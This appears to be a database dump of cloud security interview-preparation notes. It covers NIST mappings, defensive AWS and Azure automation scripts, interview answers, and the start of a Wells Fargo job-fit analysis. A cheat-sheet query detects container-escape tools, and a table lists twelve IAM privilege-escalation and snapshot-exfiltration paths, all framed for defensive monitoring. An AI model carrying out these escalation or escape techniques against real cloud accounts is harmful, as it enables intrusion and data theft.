| | AC-3 | Access Enforcement | IAM least privilege, RBAC, SCPs, Azure Policies |
| | AC-6 | Least Privilege | CIEM effective permissions analysis, quarterly access review |
| | AC-17 | Remote Access | VPN/SSO required, no direct SSH to production |
| **AU (Audit)** | AU-2 | Audit Events | CloudTrail all regions, K8s audit logs, VPC Flow Logs |
| | AU-3 | Content of Audit Records | Ensure logs contain who, what, when, where, outcome |
| | AU-6 | Audit Review | SIEM correlation, weekly log review, automated alerting |
| | AU-12 | Audit Generation | Enable all audit sources, forward to central SIEM |
| **CA (Assessment)** | CA-7 | Continuous Monitoring | CSPM continuous scanning, CWPP runtime monitoring |
| | CA-8 | Penetration Testing | Annual pen test, red team exercises, purple team |
| **CM (Config Mgmt)** | CM-2 | Baseline Configuration | CIS benchmarks loaded as CSPM policies |
| | CM-6 | Configuration Settings | CSPM IOMs detect deviations from baseline |
| | CM-8 | Information System Component Inventory | Asset inventory via CSPM + cloud provider APIs |
| **IR (Incident Response)** | IR-4 | Incident Handling | 6-phase IR lifecycle (Section 3.4 of Part 1) |
| | IR-5 | Incident Monitoring | CWPP detections, SIEM alerts, dashboard monitoring |
| | IR-6 | Incident Reporting | Post-incident reports, regulatory notifications |
| **RA (Risk Assessment)** | RA-3 | Risk Assessment | Cloud Risks attack path analysis, CIEM blast radius |
| | RA-5 | Vulnerability Monitoring | CWPP + image assessment + agentless scanning |
| **SC (System & Comms)** | SC-7 | Boundary Protection | SGs, NACLs, NetworkPolicies, WAF |
| | SC-8 | Transmission Confidentiality | TLS 1.2+ enforced, HTTPS-only |
| | SC-28 | Protection of Information at Rest | KMS encryption on all storage |
| **SI (System Integrity)** | SI-2 | Flaw Remediation | Vulnerability management lifecycle with SLAs |
| | SI-3 | Malicious Code Protection | CWPP malware detection, image scanning |
| | SI-4 | Information System Monitoring | CWPP + CSPM + CIEM continuous monitoring |

### Interview Answer — NIST:
> "I map our cloud security program to NIST CSF functions. Under IDENTIFY, CSPM provides the asset inventory and risk assessment. Under PROTECT, KAC and SCPs enforce access controls. Under DETECT, CWPP provides continuous runtime monitoring with IOAs. Under RESPOND, we execute the IR lifecycle from containment to eradication. Under RECOVER, we restore from clean images and conduct lessons learned. For compliance reporting, I map each Falcon detection and CSPM finding to the specific NIST 800-53 control it satisfies — this creates the audit evidence chain that satisfies both internal governance and external auditors."

## 6.3 Compliance Workflow in the Falcon Console

```
COMPLIANCE AUDIT PREPARATION:

1. GO TO: Posture and Compliance → Compliance
2. SELECT: the applicable framework (CIS AWS, NIST 800-53, SOC 2, HIPAA, PCI DSS)
3. VIEW: Pass/Fail status per control category
4. DRILL DOWN: Into failing controls → see affected resources → remediation steps
5. EXPORT: Compliance report in PDF for auditors

WHAT AUDITORS TYPICALLY ASK:

| Auditor Question                          | Where to Get Evidence                    |
|------------------------------------------|------------------------------------------|
| "Show vulnerability scan results"         | Vulnerabilities → Image Assessments      |
| "Show compliance posture over time"       | Posture → Compliance → trend chart       |
| "Show your IR process"                    | IR runbook doc + Falcon Fusion workflow  |
| "Show access control reviews"             | CIEM → effective permissions report      |
| "Show detection coverage"                 | Host Management → sensor coverage %      |
| "Show remediation SLA compliance"         | CSPM findings → filter by SLA status     |
| "Show data encryption enforcement"        | CSPM → filter by SC-28 controls          |
| "Show logging is enabled everywhere"      | CSPM → filter by AU-2/AU-12 controls     |
| "Show identity mgmt controls"             | CIEM → dormant accounts, privilege usage |
| "Show change management controls"         | K8s audit logs + Git commit history      |
```

---

# SECTION 7: AUTOMATION PLAYBOOKS — WHAT TO AUTOMATE AND HOW

## 7.1 Auto-Remediation: S3 Public Access

```python
# Lambda triggered by CloudTrail event: PutBucketAcl or PutBucketPolicy
import boto3, json

def lambda_handler(event, context):
    s3 = boto3.client('s3')
    bucket = event['detail']['requestParameters']['bucketName']
    
    # Enforce Block Public Access
    s3.put_public_access_block(
        Bucket=bucket,
        PublicAccessBlockConfiguration={
            'BlockPublicAcls': True,
            'IgnorePublicAcls': True,
            'BlockPublicPolicy': True,
            'RestrictPublicBuckets': True
        }
    )
    
    # Alert security team
    sns = boto3.client('sns')
    sns.publish(
        TopicArn='arn:aws:sns:us-east-1:123456789:SecurityAlerts',
        Subject=f'[AUTO-REMEDIATED] S3 bucket {bucket} public access blocked',
        Message=json.dumps({
            'action': 'BlockPublicAccessEnforced',
            'bucket': bucket,
            'triggered_by': event['detail']['userIdentity']['arn'],
            'timestamp': event['detail']['eventTime']
        })
    )
```

## 7.2 Coverage Gap Reconciliation

```python
# Daily Lambda: compare AWS EC2 instances vs Falcon reporting sensors
import boto3
from falconpy import Hosts

def reconcile_coverage():
    # Get all EC2 instances in EKS
    ec2 = boto3.client('ec2')
    instances = ec2.describe_instances(
        Filters=[{'Name': 'tag:kubernetes.io/cluster/production', 'Values': ['owned']}]
    )
    ec2_ids = {i['InstanceId'] for r in instances['Reservations'] for i in r['Instances']}
    
    # Get all Falcon-reporting hosts
    falcon = Hosts(client_id="...", client_secret="...")
    response = falcon.query_devices_by_filter(filter="platform_name:'Linux'")
    falcon_hosts = {h['hostname'] for h in response['body']['resources']}
    
    # Find gaps
    unmonitored = ec2_ids - falcon_hosts
    if unmonitored:
        alert_security_team(
            severity="HIGH",
            message=f"Coverage gap: {len(unmonitored)} EKS nodes without Falcon sensor",
            details=list(unmonitored)
        )
    
    return {'coverage': len(falcon_hosts) / len(ec2_ids) * 100}
```

## 7.3 Security Group Audit

```python
# Weekly audit: find all SGs with 0.0.0.0/0 ingress
import boto3

def audit_open_security_groups():
    ec2 = boto3.client('ec2')
    sgs = ec2.describe_security_groups()['SecurityGroups']
    
    risky_sgs = []
    for sg in sgs:
        for rule in sg.get('IpPermissions', []):
            for ip_range in rule.get('IpRanges', []):
                if ip_range.get('CidrIp') == '0.0.0.0/0':
                    risky_sgs.append({
                        'GroupId': sg['GroupId'],
                        'GroupName': sg['GroupName'],
                        'Port': rule.get('FromPort', 'All'),
                        'Protocol': rule.get('IpProtocol', 'All'),
                        'VpcId': sg.get('VpcId')
                    })
    
    if risky_sgs:
        create_jira_tickets(risky_sgs)
        notify_slack(f"Found {len(risky_sgs)} SGs with 0.0.0.0/0 ingress")
    
    return risky_sgs
```

## 7.4 IAM Credential Rotation Enforcement

```python
# Automated: deactivate IAM keys unused for 90 days, delete after 120
import boto3
from datetime import datetime, timezone

def enforce_key_rotation():
    iam = boto3.client('iam')
    users = iam.list_users()['Users']
    now = datetime.now(timezone.utc)
    
    for user in users:
        keys = iam.list_access_keys(UserName=user['UserName'])['AccessKeyMetadata']
        for key in keys:
            age_days = (now - key['CreateDate']).days
            last_used = iam.get_access_key_last_used(AccessKeyId=key['AccessKeyId'])
            
            if last_used.get('LastUsedDate'):
                idle_days = (now - last_used['LastUsedDate']).days
            else:
                idle_days = age_days
            
            if idle_days > 120 and key['Status'] == 'Inactive':
                iam.delete_access_key(UserName=user['UserName'], AccessKeyId=key['AccessKeyId'])
                log(f"DELETED key {key['AccessKeyId']} for {user['UserName']} (idle {idle_days}d)")
            
            elif idle_days > 90 and key['Status'] == 'Active':
                iam.update_access_key(UserName=user['UserName'],
                                      AccessKeyId=key['AccessKeyId'], Status='Inactive')
                notify_user_and_manager(user['UserName'], key['AccessKeyId'], idle_days)
```

## 7.5 Compliance Summary Generator (PowerShell for Azure)

```powershell
# Weekly Azure compliance report
$subscriptions = Get-AzSubscription

foreach ($sub in $subscriptions) {
    Set-AzContext -Subscription $sub.Id
    
    # Get compliance state
    $compliance = Get-AzPolicyState -SubscriptionId $sub.Id |
        Group-Object ComplianceState |
        Select-Object Name, Count
    
    $nonCompliant = Get-AzPolicyState -SubscriptionId $sub.Id |
        Where-Object { $_.ComplianceState -eq "NonCompliant" } |
        Group-Object PolicyDefinitionName |
        Sort-Object Count -Descending |
        Select-Object -First 10 Name, Count
    
    Write-Output "=== Subscription: $($sub.Name) ==="
    Write-Output "Compliant: $($compliance | Where-Object Name -eq 'Compliant' | Select -Exp Count)"
    Write-Output "Non-Compliant: $($compliance | Where-Object Name -eq 'NonCompliant' | Select -Exp Count)"
    Write-Output "Top 10 violations:"
    $nonCompliant | ForEach-Object { Write-Output "  $($_.Count)x $($_.Name)" }
}
```

---

# SECTION 8: INTERVIEW Q&A — 25 QUESTIONS ALIGNED TO EY JD

## Category 1: CNAPP Platform Mastery

### Q1: "Walk me through how you use a CNAPP tool to secure a client's cloud environment."

> "I start by onboarding their AWS/Azure/GCP accounts into the CNAPP — with CrowdStrike Falcon, that's through CloudFormation for AWS, ARM template for Azure. This gives us API-based access for CSPM scanning. For runtime protection (CWPP), I deploy the Falcon sensor as a DaemonSet on EKS clusters, which provides eBPF-based telemetry across all containers on every node. For admission control, I deploy KAC as a validating webhook. Once deployed, I establish three operational rhythms: **daily** — triage new Critical/High detections; **weekly** — review posture score trends, SLA compliance, and coverage gaps; **monthly** — tool tuning cycle to reduce false positives and improve signal quality."

### Q2: "What's the difference between CWPP and CSPM?"

> "CSPM is the building inspector — it checks whether your cloud resources are configured securely against benchmarks like CIS. It finds that your S3 bucket is public or your Security Group allows SSH from 0.0.0.0/0. CWPP is the security camera inside — it monitors what's happening at runtime in your workloads. It detects a reverse shell, a crypto miner, or container drift. You need both because CSPM can't see malware running inside a container, and CWPP can't see that your S3 bucket is publicly readable. The operational model is: CSPM prevents attack surface, CWPP catches exploitation. The SLA between a CSPM finding and remediation is your most critical security metric."

### Q3: "How does CIEM fit into the CNAPP ecosystem?"

> "CIEM answers: 'If this identity is compromised, what can the attacker do?' It computes effective permissions including transitive role chains, maps all privilege escalation paths like PassRole-to-Lambda or AssumeRole chaining, and identifies dormant/over-privileged credentials. In incident response, CIEM provides immediate blast radius computation — when a credential is compromised, I know the worst-case impact in seconds, not hours."

### Q4: "Compare CrowdStrike Falcon with Orca, Wiz, and Prisma."

> "CrowdStrike uses an agent (eBPF sensor) for deep runtime visibility plus agentless for CSPM. Orca and Wiz are 100% agentless using snapshot scanning — fast deployment, zero performance impact, but limited real-time runtime detection. Prisma Cloud is a hybrid — agent (Defender) for runtime, agentless for CSPM. The choice depends on the use case: for a consulting firm like EY managing multiple client environments, agentless tools enable rapid onboarding. For organizations running their own production workloads, agent-based CWPP provides deeper runtime detection. In practice, I recommend agent-based for production workloads and agentless for broader coverage."

## Category 2: Vulnerability Management & SLAs

### Q5: "Describe your end-to-end vulnerability management lifecycle."

> "Six phases: Discover — I scan all cloud assets continuously. Assess — I validate that findings are real and contextually relevant. Prioritize — using risk scoring (not just CVSS) that factors in exploitability, exposure, data sensitivity, and blast radius. Remediate — tickets auto-assigned with specific fix steps and SLA timers. Verify — re-scan after fix, close only when confirmed. Report — executive dashboard with MTTR, SLA compliance, and age analysis. The key differentiator is that I prioritize by attack path, not individual CVE severity. A Medium CVE on a public-facing internet asset with an admin IAM role is more dangerous than an isolated Critical CVE."

### Q6: "How do you shape remediation SLAs?"

> "SLAs are based on three factors: severity, exposure, and data sensitivity. Critical CVE on a public-facing asset with PII gets a 4-hour SLA. The same Critical CVE on an internal dev instance gets 24 hours. I enforce SLAs through automated escalation: at 50% elapsed time, the owner gets a reminder; at 100%, the engineering manager is notified; at 150%, the CISO gets a governance report. Repeated SLA breaches trigger a process review with the team. The target is >95% SLA compliance."

### Q7: "How do you implement build-breaking policies?"

> "I enforce security gates at two points. First, in the CI/CD pipeline: image scans and IaC scans fail the build on Critical/High findings. The developer sees the exact CVE, affected package, and remediation guidance — not just a red build. Second, at the admission layer: even if someone bypasses the pipeline, KAC blocks deployments with Critical CVEs or security misconfigurations. The key to adoption is communication — engineering teams must understand why their build broke and have a clear exception process for legitimate urgency."

## Category 3: Detection & Investigation

### Q8: "How do you distinguish a true positive from a false positive?"

> "I use a three-step process: context, process tree, and correlation. First, context — what workload, what environment, what time? Second, process tree — is the parent-child chain expected? A web server spawning bash is always suspicious; a CI runner spawning bash is expected. Third, correlation — are there other signals? A single low-severity alert might be noise, but the same alert correlated with a CSPM finding and a CIEM anomaly is almost certainly real. My default: when in doubt, treat as TP. I'd rather investigate a false alarm than ignore a real attack."

### Q9: "How do you handle alert fatigue?"

> "Alert fatigue is a process problem, not a tooling problem. My approach: tuning — monthly review of alert types by TP rate, suppressing known FPs with documented justification and expiry. Correlation — SIEM rules that only page the analyst when multiple signals align. SLAs — CSPM findings go through automated ticketing, not manual triage. The metric I track is 'actionable alert rate' — what percentage of alerts that reach a human require a real response? Target is >80%."

### Q10: "Explain IOA vs IOC vs IOM."

> "IOA — Indicator of Attack — behavioral detection. Watches what processes DO regardless of whether the binary is known malicious. Catches zero-days. IOC — Indicator of Compromise — signature-based. Matches known malicious hashes, IPs, domains. Fast but requires prior knowledge. IOM — Indicator of Misconfiguration — configuration audit. Catches insecure settings before they're exploited. Priority order for maturity: IOMs prevent attack surface, IOAs catch unknown threats, IOCs catch known threats fast."

## Category 4: Incident Response

### Q11: "Walk through a container escape incident from detection to post-incident."

> "**Identification:** Falcon fires `ContainerEscape.Nsenter` — process tree shows nsenter with all namespace flags from inside a privileged container. **Containment:** Kill the pod, cordon the node, apply deny-all NetworkPolicy. **Investigation:** Check if kubelet kubeconfig was read — if yes, assume full cluster compromise. Check CloudTrail for API calls made with the instance role. Check for persistence (new IAM users, roles, ServiceAccounts). **Eradication:** Rotate all cluster secrets, delete any persistence mechanisms, rebuild the node from golden AMI. **Recovery:** Redeploy clean workloads, verify sensor coverage. **Post-incident:** Set KAC to PREVENT for privileged containers, document and train the team, update runbooks."

### Q12: "How do you respond to a zero-day disclosure?"

> "Four phases. Hour 0-2: use the CNAPP to instantly identify all affected assets. Generate blast radius report. Hour 2-6: deploy compensating controls — WAF rules, tightened NetworkPolicies, KAC blocks for affected images. Hour 6-48: track patching against Critical SLA. Coordinate with SOC for active exploitation attempts. Post-48h: verify all instances patched, conduct lessons learned, update policies to flag the vulnerable version as Critical."

### Q13: "You get 3 CSPM findings that individually look like HIGH but together describe a critical attack chain. How do you handle this?"

> "This is the correlation problem. Individually, a public LoadBalancer, an unchanged default password, and an over-privileged service account are each HIGH. Together, they're an internet-to-admin attack path. Using Falcon Cloud Risks or Wiz Attack Path, I visualize the chain and assign a composite risk score. This gets a CRITICAL SLA even though individual findings are HIGH. Post-incident, I implement automated correlation rules that detect these multi-finding attack chains and auto-escalate."

## Category 5: Compliance & Governance

### Q14: "How do you ensure continuous compliance with CIS benchmarks?"

> "I load the CIS benchmark profile into the CSPM tool and run continuous assessments — not annual point-in-time audits. Every CIS control maps to a specific CSPM check. Failing controls create IOMs with auto-assigned tickets and SLAs. I track compliance score continuously and alert when it drops below 95%. For audits, I export the compliance report showing pass/fail per control with evidence. The key metric is the trend line — compliance should be continuously improving, not just passing at audit time."

### Q15: "How do you map cloud security to NIST 800-53?"

> "I map each Falcon module to NIST control families: CSPM satisfies CM-2 (baseline), CM-6 (config settings), and CM-8 (inventory). CWPP satisfies SI-3 (malware protection), SI-4 (monitoring), and RA-5 (vulnerability scanning). CIEM satisfies AC-2 (account management), AC-6 (least privilege). KAC satisfies CA-7 (continuous monitoring) and CM-3 (change control). For each finding we remediate, I document which NIST control it satisfies — this creates the audit evidence chain."

### Q16: "How do you enforce governance across multiple cloud accounts?"

> "AWS Organizations with SCPs enforce immutable guardrails — deny CloudTrail deletion, require encryption, restrict regions. Azure Management Groups with Policies enforce resource compliance. GCP Organization Policies restrict locations and access patterns. Cross-cloud, the CNAPP provides unified governance with consistent policy enforcement. I implement this as defense-in-depth: SCP at the account level → CSPM at the resource level → KAC at the workload level → CWPP at runtime."

## Category 6: Tools, Automation & Integration

### Q17: "How do you integrate CNAPP with SIEM and ticketing?"

> "CNAPP findings push to SIEM via API/webhook. I create correlation rules — a CSPM finding for 'public-facing asset with critical CVE' correlated with a GuardDuty 'anomalous API call' on the same asset escalates to P1. For ticketing, Critical/High findings auto-create Jira tickets with affected asset, remediation steps, SLA timer, and auto-assignment via resource tagging. Bi-directional sync: when the ticket is resolved, the CNAPP re-verifies and auto-closes if remediated."

### Q18: "What automation opportunities do you look for?"

> "Three patterns: repeatability — same fix more than 3 times, automate it; speed — manual remediation slower than SLA, automate it; consistency — different engineers fix the same issue differently, standardize and automate. Examples: auto-block S3 public access via Lambda, auto-rotate stale IAM keys, auto-reconcile sensor coverage, auto-create compliance reports."

### Q19: "How do you tune scanning tools to improve visibility?"

> "Monthly cycle: analyze top-10 noisiest alerts by volume, calculate TP rate for each. Alert types with <50% TP rate get tuned — narrow the scope, adjust thresholds, or add suppressions with documentation and expiry. Alert types with 0% TP rate get reviewed — is the alert irrelevant or is our environment clean? Apply changes in staging first, monitor 72 hours, then move to production. I track three metrics: alert volume reduction %, TP rate improvement, and MTTD improvement."

## Category 7: Multi-Cloud & AWS

### Q20: "How do you secure IAM across multi-cloud?"

> "The principles are the same across clouds: least privilege, MFA enforcement, credential rotation, and anomaly detection. The implementations differ: AWS uses IAM Access Analyzer and SCPs, Azure uses PIM for just-in-time access, GCP uses IAM Recommender. CIEM provides the cross-cloud unified view — it identifies over-privileged identities regardless of provider. I conduct quarterly access reviews using CIEM data, focusing on effective permissions rather than just assigned policies."

### Q21: "What are the key AWS security services you integrate?"

> "CloudTrail for API audit logging, GuardDuty for threat detection, Security Hub for centralized findings, IAM Access Analyzer for permission analysis, Inspector for vulnerability scanning, Macie for data discovery, KMS for encryption management, Organizations + SCPs for governance, Config for configuration compliance, and Secrets Manager for credential management. These complement the CNAPP — native services provide cloud-specific context that enriches CNAPP findings."

## Category 8: Behavioral & Stakeholder

### Q22: "How do you translate security findings for non-technical stakeholders?"

> "Three elements: What — '47 cloud resources are publicly accessible from the internet.' So what — 'If exploited, this exposes 2.1 million customer records and triggers mandatory breach notification.' Now what — 'We can fix 80% by enabling a single AWS setting, deployable in 48 hours with zero downtime.' I use risk scores (98/100) because executives understand numbers. I avoid jargon like 'S3 ACL' and say 'customer data storage publicly accessible.' I always present solutions alongside problems."

### Q23: "Tell me about a time you pushed back on a stakeholder."

> "A development lead wanted to deploy a container with `privileged: true` because their monitoring tool 'needed it.' Instead of blocking, I investigated. The tool only needed `CAP_NET_ADMIN` — one specific capability, not full privileged access. I demonstrated the risk by showing what an attacker can do with privileged access — mount the host filesystem, read cluster secrets, move laterally. The developer agreed to use the specific capability. My approach: don't just say no — understand the requirement, find the least-privilege solution, and educate through concrete risk demonstration."

### Q24: "How do you handle a situation where risk is accepted but you disagree?"

> "I document my risk assessment with data: potential impact, likelihood, blast radius, and recommended mitigations. If the business decides to accept, I ensure it's formalized — risk owner sign-off at VP level, compensating controls documented, 90-day maximum duration, quarterly review. I track it in the risk register and revisit at every review. Ultimately, informed risk acceptance is a valid business decision — my job is ensuring the decision-makers have complete and accurate information."

### Q25: "What's your 30-60-90 day plan?"

> **Days 1-30 (Learn & Assess):** Map EY's cloud environment, get access to CNAPP/SIEM/ticketing, review existing posture findings and suppression backlog, meet all stakeholders, identify top-10 recurring issues, create 'State of Cloud Security' baseline.

> **Days 31-60 (Optimize & Automate):** Close top-20 critical findings, implement tiered SLAs with automated escalation, tune top-10 noisiest alerts (reduce FP rate <15%), set up 3 auto-remediation workflows, start KAC rollout in Alert mode, build weekly metrics dashboard.

> **Days 61-90 (Mature & Lead):** Switch critical KAC rules to PREVENT, enable drift prevention in production, launch quarterly access review using CIEM, implement CI/CD build-breaking policy for Critical CVEs, present '90-Day Improvement Report' — posture score improvement, findings closed, coverage achieved, automation implemented.

---

# SECTION 9: KEY COMMANDS CHEAT SHEET

```bash
# === AWS IAM ===
aws sts get-caller-identity                           # Who am I?
aws iam list-roles | jq '.Roles[] | {RoleName, Arn}'  # All roles
aws iam generate-credential-report                     # Credential audit
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,\
  AttributeValue=AssumeRole --max-results 20           # Role history

# === Emergency Containment ===
aws iam put-role-policy --role-name ROLE \
  --policy-name EmergencyDeny --policy-document \
  '{"Version":"2012-10-17","Statement":[{"Effect":"Deny",
  "Action":"*","Resource":"*","Condition":{"DateLessThan":
  {"aws:TokenIssueTime":"CURRENT_TIME"}}}]}'            # Revoke sessions

# === EKS / Kubernetes ===
kubectl get configmap aws-auth -n kube-system -o yaml   # Check RBAC mapping
kubectl get pods -A -o json | jq '.items[] |
  select(.spec.containers[].securityContext.privileged
  ==true) | .metadata'                                   # Find privileged pods
kubectl auth can-i --list --as=system:serviceaccount:NS:SA # SA permissions
kubectl get networkpolicies -A                           # List all NetPols
kubectl get ds -n falcon-system                          # Falcon DaemonSet status

# === S3 Security ===
aws s3api get-public-access-block --bucket NAME         # Public access check
aws s3api get-bucket-policy --bucket NAME               # Bucket policy

# === Azure ===
Get-AzNetworkSecurityGroup | ForEach-Object {            # Open NSG rules
  $_.SecurityRules | Where-Object {
    $_.SourceAddressPrefix -eq '*' -and $_.Access -eq 'Allow'
  }
}
Get-AzPolicyState | Where-Object ComplianceState -eq 'NonCompliant'

# === Falcon Insight Queries ===
event_simpleName=ProcessRollup2
  | where CommandLine matches "nsenter|mount|chroot"     # Container escape
event_simpleName=ContainerDriftFileCreated
  | where timestamp > now() - 24h                        # Recent drift
event_simpleName=DnsRequest
  | where IsFirstSeenDomain == true                      # First-seen domains
```

---

# SECTION 10: IAM PRIVILEGE ESCALATION PATHS TO MONITOR

| # | Path | What Attacker Does | CIEM Detection |
|---|------|-------------------|---------------|
| 1 | `iam:CreatePolicyVersion` | Replace managed policy with admin permissions | PolicyVersionCreated |
| 2 | `iam:PassRole` + `lambda:CreateFunction` | Create Lambda with admin role | UnusualRolePassage |
| 3 | `iam:PassRole` + `ec2:RunInstances` | Launch EC2 with admin instance profile | InstanceProfileEscalation |
| 4 | `sts:AssumeRole` (no condition) | Lateral movement across accounts | CrossAccountRoleChain |
| 5 | IRSA JWT + no SourceVpc | SA token used from external IP | ExternalIRSAAbuse |
| 6 | `aws-auth` ConfigMap edit | Map IAM role to cluster-admin | KubernetesRBACEscalation |
| 7 | AWS Config + Lambda | Self-healing backdoor every 24h | PersistenceViaConfig |
| 8 | `iam:SetDefaultPolicyVersion` | Activate dormant admin policy version | PolicyVersionActivated |
| 9 | `iam:CreateAccessKey` | Create long-lived keys for any user | NewAccessKeyCreated |
| 10 | `iam:AddUserToGroup` | Add self to admin group | GroupMembershipChange |
| 11 | `lambda:UpdateFunctionCode` | Modify existing Lambda to escalate | LambdaCodeModification |
| 12 | `ec2:CreateSnapshot` + share | Exfiltrate data via snapshot sharing | SnapshotExfiltration |

---

# SECTION 11: THE CLOSING STATEMENT

> "The thing I've learned from every incident I've investigated is that the breach was almost always preventable. The findings existed. The detections fired. The gap was always in the process — someone didn't act on the CSPM finding, the SLA wasn't enforced, the findings weren't correlated. I build security programs that close that gap. Not just deploying tools, but building the operational muscle that turns detections into outcomes — timely remediation, enforced SLAs, automated response, and a culture where security is everyone's responsibility. At EY, I want to bring that operational maturity to help clients move from having security tools to having security outcomes."

---

*End of Ultimate Interview Preparation Guide*

*Sources synthesized: Cloud Security Complete Playbook, CNAPP Structured Guide, KAC & Runtime Detections Guide, Advanced Cloud Security Study Guide, Cloud Security Mock Interview, Unified Mastery Guide, EY Interview Prep, cloud_security_interview_guide, and CrowdStrike Falcon Cloud Security 2024-2025 internet research.*$VELSEC$, '2026-06-05')
ON CONFLICT (id) DO UPDATE SET
  title = EXCLUDED.title,
  category = EXCLUDED.category,
  tags = EXCLUDED.tags,
  content = EXCLUDED.content,
  last_updated = EXCLUDED.last_updated;

INSERT INTO public.notes (id, title, category, tags, content, last_updated)
VALUES ($VELSEC$WellsFargo_JD_Coverage_Analysis$VELSEC$, $VELSEC$Wellsfargo Jd Coverage Analysis$VELSEC$, $VELSEC$Career Development$VELSEC$, ARRAY['Interview_Preparation']::TEXT[], $VELSEC$# 🏦 Wells Fargo Senior Info Security Analyst — What You Already Know vs What to Learn

> **Role:** Senior Information Security Analyst — Cloud Workload Lifecycle Security (CWLS) Findings Management
> **Company:** Wells Fargo
> **Focus:** Wiz CSPM/CWPP Findings Management, Power BI, ServiceNow, Azure/GCP

---

## COVERAGE SUMMARY AT A GLANCE

```
JD REQUIREMENT                              COVERAGE    SOURCE FILE(S)
──────────────────────────────────────────────────────────────────────────
CSPM/CWPP findings triage & management      ✅ 90%      All guides
Wiz platform (attack paths, compliance)     ✅ 70%      Part1 (Sec 2.3 tool comparison)
Splunk integration                          ✅ 60%      EY_Prep (Sec 8), Part2 (Q17)
Cloud misconfigs (IAM, network, storage)    ✅ 95%      Part1 (Sec 3.2, 3.8), Part2 (Sec 6)
Compliance (CIS, NIST)                      ✅ 90%      Part2 (Sec 6)
Vulnerability management lifecycle          ✅ 95%      Part1 (Sec 3.1), EY_Prep (Sec 4)
SLA tracking & escalation                   ✅ 85%      Part1 (Sec 3.5), Automation Script 5
Container/K8s security                      ✅ 95%      Part1 (Sec 3.8 PSS), all guides
Azure/GCP specific controls                 ⚠️ 40%      EY_Prep (Sec 5, 9) — mostly AWS-focused
Power BI / DAX / Power Query                ❌ 0%       NOT COVERED — NEW SKILL NEEDED
Excel (VLOOKUP, PivotTables, Power Query)   ❌ 0%       NOT COVERED — NEW SKILL NEEDED
ServiceNow (CMDB, ticket routing)           ❌ 0%       NOT COVERED — NEW SKILL NEEDED
SQL queries for dashboards                  ❌ 5%       NOT COVERED — NEW SKILL NEEDED
REST API / JSON data processing             ⚠️ 50%      Automation scripts use APIs
Stakeholder engagement / office hours       ✅ 80%      EY_Prep (Sec 10), Part2 (Q22-24)
SOPs / KB articles / documentation          ⚠️ 40%      Mentioned but not detailed
```

---

## SECTION 1: WHAT YOU ALREADY LEARNED — JD Requirement by Requirement

---

### ✅ 1. "Manage security findings, alerts, and exceptions across CSPM, CWPP"

**You know this well. Here's where you learned it:**

| What You Learned | Where |
|-----------------|-------|
| CSPM investigation workflow (filter → examine → remediate/suppress/accept) | `Ultimate_Prep_Part1.md` Section 3.2 |
| CWPP runtime detection investigation (process tree, drift, network) | `Ultimate_Prep_Part1.md` Section 3.3 |
| TP vs FP decision framework (context → process tree → correlation) | `Ultimate_Prep_Part2.md` Section 5.1 |
| Risk acceptance process (document → approve → expiry → review) | `Ultimate_Prep_Part2.md` Section 5.3 |
| Suppression rules with justification, scope, expiry, reviewer | `Ultimate_Prep_Part2.md` Section 5.2 |
| IOA vs IOC vs IOM differences | `Ultimate_Prep_Part2.md` Q10 |
| 20 incident scenarios with console navigation | `Ultimate_Prep_Part1.md` Section 4 |
| 10 PSS misconfigurations with detection + remediation | `Ultimate_Prep_Part1.md` Section 3.8 |
| Alert fatigue management | `Ultimate_Prep_Part2.md` Q9 |

**Wells Fargo Twist:** They use **Wiz** not CrowdStrike. But concepts are identical — you already know the Wiz comparison from Part1 Section 2.3. The key difference: Wiz is 100% agentless (snapshot-based), no runtime sensor.

---

### ✅ 2. "Cloud security misconfigurations across Azure and GCP — IAM, network, storage, VM hardening"

**You know the concepts. Here's what maps:**

| What You Learned | Where |
|-----------------|-------|
| CSPM finding types (open SGs, unencrypted storage, IAM misconfigs) | `EY_Prep.md` Section 3 |
| Multi-cloud security controls matrix (AWS/Azure/GCP) | `Ultimate_Prep_Part1.md` Section 2.4 |
| CIS AWS Benchmarks (detailed control-level) | `Ultimate_Prep_Part2.md` Section 6.1 |
| CIS EKS Benchmarks (12 key controls) | `Ultimate_Prep_Part2.md` Section 6.1 |
| NIST 800-53 → cloud control mapping | `Ultimate_Prep_Part2.md` Section 6.2 |
| IAM privilege escalation paths (12 paths) | `Ultimate_Prep_Part2.md` Section 10 |
| False positive investigation process | `EY_Prep.md` Section 3 Q2 |
| S3/SG/IAM misconfigurations with remediation | `Advanced_Study_Guide.md`, `EY_Prep.md` |
| Azure NSG audit (PowerShell script) | `EY_Prep.md` Section 11 |
| Azure compliance report (PowerShell) | `Automation_Scripts.md` Script 5 (PowerShell) |

**⚠️ Gap:** Your materials are **heavily AWS-focused**. Wells Fargo specifically asks for **Azure and GCP**. You need to study:
- Azure: NSGs, Azure Policy, Key Vault, Defender for Cloud, Entra ID (formerly Azure AD), Storage Account security
- GCP: Firewall Rules, Organization Policies, Cloud KMS, SCC (Security Command Center), IAM Recommender

---

### ✅ 3. "Vulnerability management lifecycle — compliance & vulnerability scanning for containers/Kubernetes"

**Strongly covered:**

| What You Learned | Where |
|-----------------|-------|
| 6-phase vuln lifecycle (Discover → Assess → Prioritize → Remediate → Verify → Report) | `Ultimate_Prep_Part1.md` Section 3.1 |
| SLA framework (severity × exposure × data sensitivity) | `Ultimate_Prep_Part1.md` Section 3.5 |
| SLA escalation chain (50% → 75% → 100% → 150%) | `Ultimate_Prep_Part1.md` Section 3.5 |
| Image assessment workflow | `Ultimate_Prep_Part1.md` Section 2.2 |
| Build-breaking policies (CI/CD security gates) | `Ultimate_Prep_Part1.md` Section 3.7 |
| Container security lifecycle (build → registry → admit → runtime → network) | `EY_Prep.md` Section 6 |
| KAC admission control policies | `CNAPP_Structured_Guide.md`, `KAC_Guide.md` |
| Pod Security Standards (10 misconfigs with scenarios) | `Ultimate_Prep_Part1.md` Section 3.8 |
| Automated SLA tracker script | `Automation_Scripts.md` Script 5 |

---

### ✅ 4. "Wiz (attack paths, compliance issues, CCR)"

**Partially covered — you know the concepts, need Wiz-specific UI knowledge:**

| What You Learned | Where |
|-----------------|-------|
| CNAPP tool comparison (CrowdStrike vs Orca vs **Wiz** vs Prisma) | `Ultimate_Prep_Part1.md` Section 2.3 |
| Attack path analysis (Cloud Risks in Falcon = Attack Path in Wiz) | `Ultimate_Prep_Part1.md` Section 2.2 |
| Compliance framework mapping (CIS, NIST, SOC2, HIPAA, PCI) | `Ultimate_Prep_Part2.md` Section 6 |

**What you know about Wiz specifically:**
- 100% agentless via snapshot scanning
- Strong CSPM, CIEM, DSPM, IaC scanning
- Excellent attack path visualization (graph-based)
